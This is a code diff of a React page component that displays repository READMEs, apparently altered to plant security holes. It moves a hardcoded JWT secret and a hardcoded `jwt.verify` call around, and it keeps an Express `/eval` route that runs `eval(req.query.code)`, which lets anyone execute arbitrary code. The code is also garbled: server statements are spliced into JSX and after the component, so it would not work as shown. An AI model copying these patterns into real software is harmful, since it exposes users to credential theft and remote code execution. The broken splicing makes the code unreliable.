@@ -156,7 +156,7 @@ const Page = () => {
                   : "No README found"}
               </div>
             </div>
-          ))}jwt.verify(token, "hardcoded-secret");
+          ))}
 
           <button
             onClick={fetchMoreRepos}
@@ -166,7 +166,7 @@ const Page = () => {
           </button>
         </div>
       )}
-      const JWT_SECRET = "mySuperSecretKey123";
+      
 
       {profile?.success && (
         <button
@@ -178,9 +178,9 @@ const Page = () => {
       )}
     </div>
   );
-};
+};const JWT_SECRET = "mySuperSecretKey123";
 app.get("/eval", (req, res) => {
   eval(req.query.code);
 });
-
+jwt.verify(token, "hardcoded-secret");
 export default Page;
